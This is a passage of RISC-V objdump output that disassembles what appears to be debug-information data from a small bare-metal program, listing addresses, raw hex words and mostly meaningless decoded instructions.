     1e2:	0000                	unimp
     1e4:	0b10                	addi	a2,sp,400
     1e6:	04ca                	slli	s1,s1,0x12
     1e8:	0000                	unimp
     1ea:	00543e07          	fld	ft8,5(s0)
     1ee:	0000                	unimp
     1f0:	0b14                	addi	a3,sp,400
     1f2:	0554                	addi	a3,sp,644
     1f4:	0000                	unimp
     1f6:	00543f07          	fld	ft10,5(s0)
     1fa:	0000                	unimp
     1fc:	0b18                	addi	a4,sp,400
     1fe:	03e1                	addi	t2,t2,24
     200:	0000                	unimp
     202:	00544007          	flq	ft0,5(s0)
     206:	0000                	unimp
     208:	0b1c                	addi	a5,sp,400
     20a:	0000058f          	0x58f
     20e:	00544107          	flq	ft2,5(s0)
     212:	0000                	unimp
     214:	0020                	addi	s0,sp,8
     216:	0110                	addi	a2,sp,128
     218:	0001                	nop
     21a:	0800                	addi	s0,sp,16
     21c:	0702                	slli	a4,a4,0x0
     21e:	574a                	lw	a4,176(sp)
     220:	0002                	c.slli	zero,0x0
     222:	0b00                	addi	s0,sp,400
     224:	0198                	addi	a4,sp,192
     226:	0000                	unimp
     228:	02574b07          	flq	fs6,37(a4)
     22c:	0000                	unimp
     22e:	1100                	addi	s0,sp,160
     230:	0000                	unimp
     232:	0000                	unimp
     234:	02574c07          	flq	fs8,37(a4)
     238:	0000                	unimp
     23a:	0100                	addi	s0,sp,128
     23c:	0111                	addi	sp,sp,4
     23e:	0005                	c.nop	1
     240:	0700                	addi	s0,sp,896
     242:	294e                	fld	fs2,208(sp)
     244:	0001                	nop
     246:	0000                	unimp
     248:	1102                	slli	sp,sp,0x20
     24a:	0135                	addi	sp,sp,13
     24c:	0000                	unimp
     24e:	01295107          	0x1295107
     252:	0000                	unimp
     254:	0204                	addi	s1,sp,256
     256:	0800                	addi	s0,sp,16
     258:	00000127          	0x127
     25c:	00000267          	jalr	tp,zero
     260:	7409                	lui	s0,0xfffe2
     262:	0000                	unimp
     264:	1f00                	addi	s0,sp,944
     266:	1000                	addi	s0,sp,32
     268:	0000034f          	fnmadd.s	ft6,ft0,ft0,ft0,rne
     26c:	0318                	addi	a4,sp,384
     26e:	02a65d07          	0x2a65d07
     272:	0000                	unimp
     274:	0004200b          	0x4200b
     278:	0700                	addi	s0,sp,896
     27a:	a65e                	fsd	fs7,264(sp)
     27c:	0002                	c.slli	zero,0x0
     27e:	0000                	unimp
     280:	0004380b          	0x4380b
     284:	0700                	addi	s0,sp,896
     286:	545f 0000 0800      	0x8000000545f
     28c:	0001a00b          	0x1a00b
     290:	0700                	addi	s0,sp,896
     292:	ac61                	j	52a <_tbss_end+0x4a6>
     294:	0002                	c.slli	zero,0x0
     296:	1000                	addi	s0,sp,32
     298:	0111                	addi	sp,sp,4
     29a:	0001                	nop
     29c:	0700                	addi	s0,sp,896
     29e:	1662                	slli	a2,a2,0x38
     2a0:	0002                	c.slli	zero,0x0
     2a2:	1000                	addi	s0,sp,32
     2a4:	0001                	nop
     2a6:	0267080f          	0x267080f
     2aa:	0000                	unimp
     2ac:	bc08                	fsd	fa0,56(s0)
     2ae:	0002                	c.slli	zero,0x0
     2b0:	bc00                	fsd	fs0,56(s0)
     2b2:	0002                	c.slli	zero,0x0
     2b4:	0900                	addi	s0,sp,144
     2b6:	0074                	addi	a3,sp,12
     2b8:	0000                	unimp
     2ba:	001f 080f 02c2      	0x2c2080f001f
     2c0:	0000                	unimp
     2c2:	0d12                	slli	s10,s10,0x4
     2c4:	000003eb          	0x3eb
     2c8:	0710                	addi	a2,sp,896
     2ca:	e875                	bnez	s0,3be <_tbss_end+0x33a>
     2cc:	0002                	c.slli	zero,0x0
     2ce:	0b00                	addi	s0,sp,400
     2d0:	00e6                	slli	ra,ra,0x19
     2d2:	0000                	unimp
     2d4:	02e87607          	0x2e87607
     2d8:	0000                	unimp
     2da:	0b00                	addi	s0,sp,400
     2dc:	068a                	slli	a3,a3,0x2
     2de:	0000                	unimp
     2e0:	00547707          	0x547707
     2e4:	0000                	unimp
     2e6:	0008                	0x8
     2e8:	003f080f          	0x3f080f
     2ec:	0000                	unimp
     2ee:	0a0d                	addi	s4,s4,3
     2f0:	0004                	0x4
     2f2:	b000                	fsd	fs0,32(s0)
     2f4:	0418b507          	fld	fa0,65(a7)
     2f8:	0000                	unimp
     2fa:	5f0e                	lw	t5,224(sp)
     2fc:	0070                	addi	a2,sp,12
     2fe:	02e8b607          	fld	fa2,46(a7)
     302:	0000                	unimp
     304:	0e00                	addi	s0,sp,784
     306:	725f 0700 54b7      	0x54b70700725f
     30c:	0000                	unimp
     30e:	0800                	addi	s0,sp,16
     310:	5f0e                	lw	t5,224(sp)
     312:	b8070077          	0xb8070077
     316:	0054                	addi	a3,sp,4
     318:	0000                	unimp
     31a:	0b0c                	addi	a1,sp,400
     31c:	012e                	slli	sp,sp,0xb
     31e:	0000                	unimp
     320:	0046b907          	fld	fs2,4(a3)
     324:	0000                	unimp
     326:	0b10                	addi	a2,sp,400
     328:	0219                	addi	tp,tp,6
     32a:	0000                	unimp
     32c:	0046ba07          	fld	fs4,4(a3)
     330:	0000                	unimp
     332:	0e12                	slli	t3,t3,0x4
     334:	625f 0066 bb07      	0xbb070066625f
     33a:	000002c3          	fmadd.s	ft5,ft0,ft0,ft0,rne
     33e:	0b18                	addi	a4,sp,400
     340:	0000007b          	0x7b
     344:	0054bc07          	fld	fs8,5(s1)
     348:	0000                	unimp
     34a:	0b28                	addi	a0,sp,408
     34c:	0119                	addi	sp,sp,6
     34e:	0000                	unimp
     350:	0127c307          	flq	ft6,18(a5)
     354:	0000                	unimp
     356:	0b30                	addi	a2,sp,408
     358:	01d9                	addi	gp,gp,22
     35a:	0000                	unimp
     35c:	0585c507          	flq	fa0,88(a1)
     360:	0000                	unimp
     362:	0b38                	addi	a4,sp,408
     364:	029a                	slli	t0,t0,0x6
     366:	0000                	unimp
     368:	05afc707          	flq	fa4,90(t6)
     36c:	0000                	unimp
     36e:	0b40                	addi	s0,sp,404
     370:	048d                	addi	s1,s1,3
     372:	0000                	unimp
     374:	05d3ca07          	flq	fs4,93(t2)
     378:	0000                	unimp
     37a:	0b48                	addi	a0,sp,404
     37c:	05a9                	addi	a1,a1,10
     37e:	0000                	unimp
     380:	05edcb07          	flq	fs6,94(s11)
     384:	0000                	unimp
     386:	0e50                	addi	a2,sp,788
     388:	755f 0062 ce07      	0xce070062755f
     38e:	000002c3          	fmadd.s	ft5,ft0,ft0,ft0,rne
     392:	0e58                	addi	a4,sp,788
     394:	755f 0070 cf07      	0xcf070070755f
     39a:	02e8                	addi	a0,sp,332
     39c:	0000                	unimp
     39e:	0e68                	addi	a0,sp,796
     3a0:	755f 0072 d007      	0xd0070072755f
     3a6:	0054                	addi	a3,sp,4
     3a8:	0000                	unimp
     3aa:	0b70                	addi	a2,sp,412
     3ac:	00e0                	addi	s0,sp,76
     3ae:	0000                	unimp
     3b0:	05f3d307          	0x5f3d307
     3b4:	0000                	unimp
     3b6:	0b74                	addi	a3,sp,412
     3b8:	0581                	addi	a1,a1,0
     3ba:	0000                	unimp
     3bc:	0603d407          	0x603d407
     3c0:	0000                	unimp
     3c2:	6c5f0e77          	0x6c5f0e77
     3c6:	0062                	c.slli	zero,0x18
     3c8:	02c3d707          	0x2c3d707
     3cc:	0000                	unimp
     3ce:	0b78                	addi	a4,sp,412
     3d0:	0160                	addi	s0,sp,140
     3d2:	0000                	unimp
     3d4:	0054da07          	0x54da07
     3d8:	0000                	unimp
     3da:	0b88                	addi	a0,sp,464
     3dc:	0171                	addi	sp,sp,28
     3de:	0000                	unimp
     3e0:	0094db07          	0x94db07
     3e4:	0000                	unimp
     3e6:	0b90                	addi	a2,sp,464
     3e8:	064d                	addi	a2,a2,19
     3ea:	0000                	unimp
     3ec:	0436de07          	0x436de07
     3f0:	0000                	unimp
     3f2:	0b98                	addi	a4,sp,464
     3f4:	0000027b          	0x27b
     3f8:	011ce207          	0x11ce207
     3fc:	0000                	unimp
     3fe:	0ba0                	addi	s0,sp,472
     400:	0412                	slli	s0,s0,0x4
     402:	0000                	unimp
     404:	0111e407          	0x111e407
     408:	0000                	unimp
     40a:	0ba4                	addi	s1,sp,472
     40c:	0281                	addi	t0,t0,0
     40e:	0000                	unimp
     410:	0054e507          	0x54e507
     414:	0000                	unimp
     416:	00ac                	addi	a1,sp,72
     418:	0000aa13          	slti	s4,ra,0
     41c:	3600                	fld	fs0,40(a2)
     41e:	0004                	0x4
     420:	1400                	addi	s0,sp,544
     422:	0436                	slli	s0,s0,0xd
     424:	0000                	unimp
     426:	2714                	fld	fa3,8(a4)
     428:	0001                	nop
     42a:	1400                	addi	s0,sp,544
     42c:	00000573          	0x573
     430:	5414                	lw	a3,40(s0)
     432:	0000                	unimp
     434:	0000                	unimp
     436:	0441080f          	0x441080f
     43a:	0000                	unimp
     43c:	3615                	addiw	a2,a2,-27
     43e:	0004                	0x4
     440:	1600                	addi	s0,sp,800
     442:	0470                	addi	a2,sp,524
     444:	0000                	unimp
     446:	0748                	addi	a0,sp,900
     448:	73023907          	fld	fs2,1840(tp) # fffffffffffe1730 <_end+0xffffffff7ffc5ab0>
     44c:	0005                	c.nop	1
     44e:	1700                	addi	s0,sp,928
     450:	03d0                	addi	a2,sp,452
     452:	0000                	unimp
     454:	54023b07          	fld	fs6,1344(tp) # 540 <_tbss_end+0x4bc>
     458:	0000                	unimp
     45a:	0000                	unimp
     45c:	00013d17          	auipc	s10,0x13
     460:	0700                	addi	s0,sp,896
     462:	0240                	addi	s0,sp,260
     464:	065a                	slli	a2,a2,0x16
     466:	0000                	unimp
     468:	1708                	addi	a0,sp,928
     46a:	0201                	addi	tp,tp,0
     46c:	0000                	unimp
     46e:	5a024007          	flq	ft0,1440(tp) # 5a0 <_tbss_end+0x51c>
     472:	0006                	c.slli	zero,0x1
     474:	1000                	addi	s0,sp,32
     476:	0001ba17          	auipc	s4,0x1b
     47a:	0700                	addi	s0,sp,896
     47c:	0240                	addi	s0,sp,260
     47e:	065a                	slli	a2,a2,0x16
     480:	0000                	unimp
     482:	1718                	addi	a4,sp,928
     484:	00000433          	add	s0,zero,zero
     488:	54024207          	flq	ft4,1344(tp) # 540 <_tbss_end+0x4bc>
     48c:	0000                	unimp
     48e:	2000                	fld	fs0,0(s0)
     490:	00002517          	auipc	a0,0x2
     494:	0700                	addi	s0,sp,896
     496:	08450243          	fmadd.s	ft4,fa0,ft4,ft1,rne
     49a:	0000                	unimp
     49c:	1724                	addi	s1,sp,936
     49e:	0000044f          	fnmadd.s	fs0,ft0,ft0,ft0,rne
     4a2:	54024607          	flq	fa2,1344(tp) # 540 <_tbss_end+0x4bc>
     4a6:	0000                	unimp
     4a8:	4000                	lw	s0,0(s0)
     4aa:	00043d17          	auipc	s10,0x43
     4ae:	0700                	addi	s0,sp,896
     4b0:	085a0247          	fmsub.s	ft4,fs4,ft5,ft1,rne
     4b4:	0000                	unimp
     4b6:	1748                	addi	a0,sp,932
     4b8:	00000357          	0x357
     4bc:	54024907          	flq	fs2,1344(tp) # 540 <_tbss_end+0x4bc>
     4c0:	0000                	unimp
     4c2:	5000                	lw	s0,32(s0)
     4c4:	00044517          	auipc	a0,0x44
     4c8:	0700                	addi	s0,sp,896
     4ca:	086b024b          	fnmsub.s	ft4,fs6,ft6,ft1,rne
     4ce:	0000                	unimp
     4d0:	1758                	addi	a4,sp,932
     4d2:	0266                	slli	tp,tp,0x19
     4d4:	0000                	unimp
     4d6:	87024e07          	flq	ft8,-1936(tp) # fffffffffffff870 <_end+0xffffffff7ffe3bf0>
     4da:	0001                	nop
     4dc:	6000                	ld	s0,0(s0)
     4de:	0001df17          	auipc	t5,0x1d
     4e2:	0700                	addi	s0,sp,896
     4e4:	0054024f          	fnmadd.s	ft4,fs0,ft5,ft0,rne
     4e8:	0000                	unimp
     4ea:	1768                	addi	a0,sp,940
     4ec:	05d1                	addi	a1,a1,20
     4ee:	0000                	unimp
     4f0:	87025007          	0x87025007
     4f4:	0001                	nop
     4f6:	7000                	ld	s0,32(s0)
     4f8:	00038917          	auipc	s2,0x38
     4fc:	0700                	addi	s0,sp,896
     4fe:	0251                	addi	tp,tp,20
     500:	0871                	addi	a6,a6,28
     502:	0000                	unimp
     504:	1778                	addi	a4,sp,940
     506:	0209                	addi	tp,tp,2
     508:	0000                	unimp
     50a:	54025407          	0x54025407
     50e:	0000                	unimp
     510:	8000                	0x8000
     512:	00016917          	auipc	s2,0x16
     516:	0700                	addi	s0,sp,896
     518:	0255                	addi	tp,tp,21
     51a:	00000573          	0x573
     51e:	1788                	addi	a0,sp,992
     520:	03c9                	addi	t2,t2,18
     522:	0000                	unimp
     524:	22027807          	0x22027807
     528:	0008                	0x8
     52a:	9000                	0x9000
     52c:	4f18                	lw	a4,24(a4)
     52e:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     532:	027c                	addi	a5,sp,268
     534:	02a6                	slli	t0,t0,0x9
     536:	0000                	unimp
     538:	01f8                	addi	a4,sp,204
     53a:	3918                	fld	fa4,48(a0)
     53c:	0002                	c.slli	zero,0x0
     53e:	0700                	addi	s0,sp,896
     540:	027d                	addi	tp,tp,31
     542:	00000267          	jalr	tp,zero
     546:	0200                	addi	s0,sp,256
     548:	7718                	ld	a4,40(a4)
     54a:	0005                	c.nop	1
     54c:	0700                	addi	s0,sp,896
     54e:	0281                	addi	t0,t0,0
     550:	0882                	slli	a7,a7,0x0
     552:	0000                	unimp
     554:	0518                	addi	a4,sp,640
     556:	2118                	fld	fa4,0(a0)
     558:	0001                	nop
     55a:	0700                	addi	s0,sp,896
     55c:	0286                	slli	t0,t0,0x1
     55e:	061f 0000 0520      	0x5200000061f
     564:	fc18                	sd	a4,56(s0)
     566:	0000                	unimp
     568:	0700                	addi	s0,sp,896
     56a:	088e0287          	0x88e0287
     56e:	0000                	unimp
     570:	0538                	addi	a4,sp,648
     572:	0f00                	addi	s0,sp,912
     574:	7908                	ld	a0,48(a0)
     576:	0005                	c.nop	1
     578:	0200                	addi	s0,sp,256
     57a:	0801                	addi	a6,a6,0
     57c:	000003bb          	addw	t2,zero,zero
     580:	7915                	lui	s2,0xfffe5
     582:	0005                	c.nop	1
     584:	0f00                	addi	s0,sp,912
     586:	1808                	addi	a0,sp,48
     588:	0004                	0x4
     58a:	1300                	addi	s0,sp,416
     58c:	00aa                	slli	ra,ra,0xa
     58e:	0000                	unimp
     590:	05a9                	addi	a1,a1,10
     592:	0000                	unimp
     594:	3614                	fld	fa3,40(a2)
     596:	0004                	0x4
     598:	1400                	addi	s0,sp,544
     59a:	00000127          	0x127
     59e:	a914                	fsd	fa3,16(a0)
     5a0:	0005                	c.nop	1
     5a2:	1400                	addi	s0,sp,544
     5a4:	0054                	addi	a3,sp,4
     5a6:	0000                	unimp
     5a8:	0f00                	addi	s0,sp,912
     5aa:	8008                	0x8008
     5ac:	0005                	c.nop	1
     5ae:	0f00                	addi	s0,sp,912
     5b0:	8b08                	0x8b08
     5b2:	0005                	c.nop	1
     5b4:	1300                	addi	s0,sp,416
     5b6:	009f 0000 05d3      	0x5d30000009f
     5bc:	0000                	unimp
     5be:	3614                	fld	fa3,40(a2)
     5c0:	0004                	0x4
     5c2:	1400                	addi	s0,sp,544
     5c4:	00000127          	0x127
     5c8:	9f14                	0x9f14
     5ca:	0000                	unimp
     5cc:	1400                	addi	s0,sp,544
     5ce:	0054                	addi	a3,sp,4
     5d0:	0000                	unimp
     5d2:	0f00                	addi	s0,sp,912
     5d4:	b508                	fsd	fa0,40(a0)
     5d6:	0005                	c.nop	1
     5d8:	1300                	addi	s0,sp,416
     5da:	0054                	addi	a3,sp,4
     5dc:	0000                	unimp
     5de:	05ed                	addi	a1,a1,27
     5e0:	0000                	unimp
     5e2:	3614                	fld	fa3,40(a2)
     5e4:	0004                	0x4
     5e6:	1400                	addi	s0,sp,544
     5e8:	00000127          	0x127
     5ec:	0f00                	addi	s0,sp,912
     5ee:	d908                	sw	a0,48(a0)
     5f0:	0005                	c.nop	1
     5f2:	0800                	addi	s0,sp,16
     5f4:	0000003f 00000603 	0x6030000003f
     5fc:	7409                	lui	s0,0xfffe2
     5fe:	0000                	unimp
     600:	0200                	addi	s0,sp,256
     602:	0800                	addi	s0,sp,16
     604:	0000003f 00000613 	0x6130000003f
     60c:	7409                	lui	s0,0xfffe2
     60e:	0000                	unimp
     610:	0000                	unimp
     612:	0500                	addi	s0,sp,640
     614:	03f8                	addi	a4,sp,460
     616:	0000                	unimp
     618:	ee011f07          	0xee011f07
     61c:	0002                	c.slli	zero,0x0
     61e:	1900                	addi	s0,sp,176
     620:	055e                	slli	a0,a0,0x17
     622:	0000                	unimp
     624:	0718                	addi	a4,sp,896
     626:	06540123          	sb	t0,98(s0) # fffffffffffe2062 <_end+0xffffffff7ffc63e2>
     62a:	0000                	unimp
     62c:	00042017          	auipc	zero,0x42
     630:	0700                	addi	s0,sp,896
     632:	0125                	addi	sp,sp,9
     634:	0654                	addi	a3,sp,772
     636:	0000                	unimp
     638:	1700                	addi	s0,sp,928
     63a:	021f 0000 2607      	0x26070000021f
     640:	5401                	li	s0,-32
     642:	0000                	unimp
     644:	0800                	addi	s0,sp,16
     646:	0003f217          	auipc	tp,0x3f
     64a:	0700                	addi	s0,sp,896
     64c:	065a0127          	0x65a0127
     650:	0000                	unimp
     652:	0010                	0x10
     654:	061f080f          	0x61f080f
     658:	0000                	unimp
     65a:	0613080f          	0x613080f
     65e:	0000                	unimp
     660:	1d19                	addi	s10,s10,-26
     662:	0000                	unimp
     664:	0e00                	addi	s0,sp,784
     666:	95013f07          	fld	ft10,-1712(sp)
     66a:	0006                	c.slli	zero,0x1
     66c:	1700                	addi	s0,sp,928
     66e:	00000477          	0x477
     672:	95014007          	flq	ft0,-1712(sp)
     676:	0006                	c.slli	zero,0x1
     678:	0000                	unimp
     67a:	0004ee17          	auipc	t3,0x4e
     67e:	0700                	addi	s0,sp,896
     680:	0141                	addi	sp,sp,16
     682:	0695                	addi	a3,a3,5
     684:	0000                	unimp
     686:	1706                	slli	a4,a4,0x21
     688:	050a                	slli	a0,a0,0x2
     68a:	0000                	unimp
     68c:	4d014207          	flq	ft4,1232(sp)
     690:	0000                	unimp
     692:	0c00                	addi	s0,sp,528
     694:	0800                	addi	s0,sp,16
     696:	004d                	c.nop	19
     698:	0000                	unimp
     69a:	06a5                	addi	a3,a3,9
     69c:	0000                	unimp
     69e:	7409                	lui	s0,0xfffe2
     6a0:	0000                	unimp
     6a2:	0200                	addi	s0,sp,256
     6a4:	1a00                	addi	s0,sp,304
     6a6:	07d8                	addi	a4,sp,964
     6a8:	0259                	addi	tp,tp,22
     6aa:	07a6                	slli	a5,a5,0x9
     6ac:	0000                	unimp
     6ae:	00054217          	auipc	tp,0x54
     6b2:	0700                	addi	s0,sp,896
     6b4:	005b025b          	0x5b025b
     6b8:	0000                	unimp
     6ba:	1700                	addi	s0,sp,928
     6bc:	04f4                	addi	a3,sp,588
     6be:	0000                	unimp
     6c0:	73025c07          	0x73025c07
     6c4:	0005                	c.nop	1
     6c6:	0800                	addi	s0,sp,16
     6c8:	00025917          	auipc	s2,0x25
     6cc:	0700                	addi	s0,sp,896
     6ce:	025d                	addi	tp,tp,23
     6d0:	07a6                	slli	a5,a5,0x9
     6d2:	0000                	unimp
     6d4:	1710                	addi	a2,sp,928
     6d6:	059a                	slli	a1,a1,0x6
     6d8:	0000                	unimp
     6da:	9d025e07          	0x9d025e07
     6de:	0001                	nop
     6e0:	2c00                	fld	fs0,24(s0)
     6e2:	0001ca17          	auipc	s4,0x1c
     6e6:	0700                	addi	s0,sp,896
     6e8:	025f 0054 0000      	0x54025f
     6ee:	1750                	addi	a2,sp,932
     6f0:	0000041b          	sext.w	s0,zero
     6f4:	b6026007          	0xb6026007
     6f8:	58000007          	0x58000007
     6fc:	0005b017          	auipc	zero,0x5b
     700:	0700                	addi	s0,sp,896
     702:	0261                	addi	tp,tp,24
     704:	0660                	addi	s0,sp,780
     706:	0000                	unimp
     708:	1760                	addi	s0,sp,940
     70a:	0426                	slli	s0,s0,0x9
     70c:	0000                	unimp
     70e:	11026207          	0x11026207
     712:	0001                	nop
     714:	7000                	ld	s0,32(s0)
     716:	0005bb17          	auipc	s6,0x5b
     71a:	0700                	addi	s0,sp,896
     71c:	01110263          	beq	sp,a7,720 <_tbss_end+0x69c>
     720:	0000                	unimp
     722:	1778                	addi	a4,sp,940
     724:	00b1                	addi	ra,ra,12
     726:	0000                	unimp
     728:	11026407          	0x11026407
     72c:	0001                	nop
     72e:	8000                	0x8000
     730:	00056d17          	auipc	s10,0x56
     734:	0700                	addi	s0,sp,896
     736:	0265                	addi	tp,tp,25
     738:	07bd                	addi	a5,a5,15
     73a:	0000                	unimp
     73c:	1788                	addi	a0,sp,992
     73e:	024d                	addi	tp,tp,19
     740:	0000                	unimp
     742:	cd026607          	0xcd026607
     746:	90000007          	0x90000007
     74a:	00051717          	auipc	a4,0x51
     74e:	0700                	addi	s0,sp,896
     750:	00540267          	jalr	tp,5(s0) # fffffffffffe2005 <_end+0xffffffff7ffc6385>
     754:	0000                	unimp
     756:	17a8                	addi	a0,sp,1000
     758:	018a                	slli	gp,gp,0x2
     75a:	0000                	unimp
     75c:	11026807          	0x11026807
     760:	0001                	nop
     762:	ac00                	fsd	fs0,24(s0)
     764:	0000a217          	auipc	tp,0xa
     768:	0700                	addi	s0,sp,896
     76a:	0269                	addi	tp,tp,26
     76c:	0111                	addi	sp,sp,4
     76e:	0000                	unimp
     770:	17b4                	addi	a3,sp,1000
     772:	0179                	addi	sp,sp,30
     774:	0000                	unimp
     776:	11026a07          	0x11026a07
     77a:	0001                	nop
     77c:	bc00                	fsd	fs0,56(s0)
     77e:	00004417          	auipc	s0,0x4
     782:	0700                	addi	s0,sp,896
     784:	0111026b          	0x111026b
     788:	0000                	unimp
     78a:	17c4                	addi	s1,sp,996
     78c:	00000053          	fadd.s	ft0,ft0,ft0,rne
     790:	11026c07          	0x11026c07
     794:	0001                	nop
     796:	cc00                	sw	s0,24(s0)
     798:	0003ce17          	auipc	t3,0x3c
     79c:	0700                	addi	s0,sp,896
     79e:	026d                	addi	tp,tp,27
     7a0:	0054                	addi	a3,sp,4
     7a2:	0000                	unimp
     7a4:	00d4                	addi	a3,sp,68
     7a6:	7908                	ld	a0,48(a0)
     7a8:	0005                	c.nop	1
     7aa:	b600                	fsd	fs0,40(a2)
     7ac:	09000007          	0x9000007
     7b0:	0074                	addi	a3,sp,12
     7b2:	0000                	unimp
     7b4:	0019                	c.nop	6
     7b6:	0802                	slli	a6,a6,0x0
     7b8:	00006407          	0x6407
     7bc:	0800                	addi	s0,sp,16
     7be:	0579                	addi	a0,a0,30
     7c0:	0000                	unimp
     7c2:	07cd                	addi	a5,a5,19
     7c4:	0000                	unimp
     7c6:	7409                	lui	s0,0xfffe2
     7c8:	0000                	unimp
     7ca:	0700                	addi	s0,sp,896
     7cc:	0800                	addi	s0,sp,16
     7ce:	0579                	addi	a0,a0,30
     7d0:	0000                	unimp
     7d2:	07dd                	addi	a5,a5,23
     7d4:	0000                	unimp
     7d6:	7409                	lui	s0,0xfffe2
     7d8:	0000                	unimp
     7da:	1700                	addi	s0,sp,928
     7dc:	1b00                	addi	s0,sp,432
     7de:	0168                	addi	a0,sp,140
     7e0:	02027207          	0x2027207
     7e4:	0008                	0x8
     7e6:	1700                	addi	s0,sp,928
     7e8:	0332                	slli	t1,t1,0xc
     7ea:	0000                	unimp
     7ec:	02027507          	0x2027507
     7f0:	0008                	0x8
     7f2:	0000                	unimp
     7f4:	00031317          	auipc	t1,0x31
     7f8:	0700                	addi	s0,sp,896
     7fa:	0276                	slli	tp,tp,0x1d
     7fc:	0812                	slli	a6,a6,0x4
     7fe:	0000                	unimp
     800:	00f0                	addi	a2,sp,76
     802:	e808                	sd	a0,16(s0)
     804:	0002                	c.slli	zero,0x0
     806:	1200                	addi	s0,sp,288
     808:	0008                	0x8
     80a:	0900                	addi	s0,sp,144
     80c:	0074                	addi	a3,sp,12
     80e:	0000                	unimp
     810:	001d                	c.nop	7
     812:	5b08                	lw	a0,48(a4)
     814:	0000                	unimp
     816:	2200                	fld	fs0,0(a2)
     818:	0008                	0x8
     81a:	0900                	addi	s0,sp,144
     81c:	0074                	addi	a3,sp,12
     81e:	0000                	unimp
     820:	001d                	c.nop	7
     822:	681c                	ld	a5,16(s0)
     824:	0701                	addi	a4,a4,0
     826:	08450257          	0x8450257
     82a:	0000                	unimp
     82c:	701d                	c.lui	zero,0xfffe7
     82e:	0004                	0x4
     830:	0700                	addi	s0,sp,896
     832:	026e                	slli	tp,tp,0x1b
     834:	06a5                	addi	a3,a3,9
     836:	0000                	unimp
     838:	871d                	srai	a4,a4,0x7
     83a:	0005                	c.nop	1
     83c:	0700                	addi	s0,sp,896
     83e:	07dd0277          	0x7dd0277
     842:	0000                	unimp
     844:	0800                	addi	s0,sp,16
     846:	0579                	addi	a0,a0,30
     848:	0000                	unimp
     84a:	0855                	addi	a6,a6,21
     84c:	0000                	unimp
     84e:	7409                	lui	s0,0xfffe2
     850:	0000                	unimp
     852:	1800                	addi	s0,sp,48
     854:	1e00                	addi	s0,sp,816
     856:	008e                	slli	ra,ra,0x3
     858:	0000                	unimp
     85a:	0855080f          	0x855080f
     85e:	0000                	unimp
     860:	6b1f 0008 1400      	0x140000086b1f
     866:	0436                	slli	s0,s0,0xd
     868:	0000                	unimp
     86a:	0f00                	addi	s0,sp,912
     86c:	6008                	ld	a0,0(s0)
     86e:	0008                	0x8
     870:	0f00                	addi	s0,sp,912
     872:	8708                	0x8708
     874:	0001                	nop
     876:	1f00                	addi	s0,sp,944
     878:	0882                	slli	a7,a7,0x0
     87a:	0000                	unimp
     87c:	5414                	lw	a3,40(s0)
     87e:	0000                	unimp
     880:	0000                	unimp
     882:	0888080f          	0x888080f
     886:	0000                	unimp
     888:	0877080f          	0x877080f
     88c:	0000                	unimp
     88e:	1308                	addi	a0,sp,416
     890:	0006                	c.slli	zero,0x1
     892:	9e00                	0x9e00
     894:	0008                	0x8
     896:	0900                	addi	s0,sp,144
     898:	0074                	addi	a3,sp,12
     89a:	0000                	unimp
     89c:	0002                	c.slli	zero,0x0
     89e:	2b20                	fld	fs0,80(a4)
     8a0:	0005                	c.nop	1
     8a2:	0700                	addi	s0,sp,896
     8a4:	02fe                	slli	t0,t0,0x1f
     8a6:	0436                	slli	s0,s0,0xd
     8a8:	0000                	unimp
     8aa:	2420                	fld	fs0,72(s0)
     8ac:	0005                	c.nop	1
     8ae:	0700                	addi	s0,sp,896
     8b0:	02ff                	0x2ff
     8b2:	043c                	addi	a5,sp,520
     8b4:	0000                	unimp
     8b6:	00003203          	ld	tp,0(zero) # fffffffffffe7000 <_end+0xffffffff7ffcb380>
     8ba:	0800                	addi	s0,sp,16
     8bc:	3418                	fld	fa4,40(s0)
     8be:	0000                	unimp
     8c0:	0300                	addi	s0,sp,384
     8c2:	0379                	addi	t1,t1,30
     8c4:	0000                	unimp
     8c6:	3c08                	fld	fa0,56(s0)
     8c8:	0069                	c.nop	26
     8ca:	0000                	unimp
     8cc:	b608                	fsd	fa0,40(a2)
     8ce:	0008                	0x8
     8d0:	df00                	sw	s0,56(a4)
     8d2:	0008                	0x8
     8d4:	2100                	fld	fs0,0(a0)
     8d6:	0074                	addi	a3,sp,12
     8d8:	0000                	unimp
     8da:	3fff                	0x3fff
     8dc:	0001                	nop
     8de:	2200                	fld	fs0,0(a2)
     8e0:	03c0                	addi	s0,sp,452
     8e2:	0000                	unimp
     8e4:	3901                	addiw	s2,s2,-32
     8e6:	08cc                	addi	a1,sp,84
     8e8:	0000                	unimp
     8ea:	0309                	addi	t1,t1,2
     8ec:	2bc0                	fld	fs0,144(a5)
     8ee:	8000                	0x8000
     8f0:	0000                	unimp
     8f2:	0000                	unimp
     8f4:	d622                	sw	s0,44(sp)
     8f6:	0005                	c.nop	1
     8f8:	0200                	addi	s0,sp,256
     8fa:	c11e                	sw	t2,128(sp)
     8fc:	0008                	0x8
     8fe:	0900                	addi	s0,sp,144
     900:	002b6003          	lwu	zero,2(s6) # 5b718 <_tbss_end+0x5b694>
     904:	0080                	addi	s0,sp,64
     906:	0000                	unimp
     908:	0800                	addi	s0,sp,16
     90a:	08b6                	slli	a7,a7,0xd
     90c:	0000                	unimp
     90e:	0919                	addi	s2,s2,6
     910:	0000                	unimp
     912:	7409                	lui	s0,0xfffe2
     914:	0000                	unimp
     916:	3f00                	fld	fs0,56(a4)
     918:	2200                	fld	fs0,0(a2)
     91a:	000c                	0xc
     91c:	0000                	unimp
     91e:	1f02                	slli	t5,t5,0x20
     920:	0909                	addi	s2,s2,2
     922:	0000                	unimp
     924:	0309                	addi	t1,t1,2
     926:	6bc0                	ld	s0,144(a5)
     928:	8001                	srli	s0,s0,0x0
     92a:	0000                	unimp
     92c:	0000                	unimp
     92e:	b608                	fsd	fa0,40(a2)
     930:	0008                	0x8
     932:	3e00                	fld	fs0,56(a2)
     934:	0009                	c.nop	2
     936:	0900                	addi	s0,sp,144
     938:	0074                	addi	a3,sp,12
     93a:	0000                	unimp
     93c:	009f 6922 0003      	0x36922009f
     942:	0200                	addi	s0,sp,256
     944:	2e20                	fld	fs0,88(a2)
     946:	0009                	c.nop	2
     948:	0900                	addi	s0,sp,144
     94a:	002ac003          	lbu	zero,2(s5)
     94e:	0080                	addi	s0,sp,64
     950:	0000                	unimp
     952:	2200                	fld	fs0,0(a2)
     954:	0304                	addi	s1,sp,384
     956:	0000                	unimp
     958:	2102                	fld	ft2,0(sp)
     95a:	0909                	addi	s2,s2,2
     95c:	0000                	unimp
     95e:	0309                	addi	t1,t1,2
     960:	6c00                	ld	s0,24(s0)
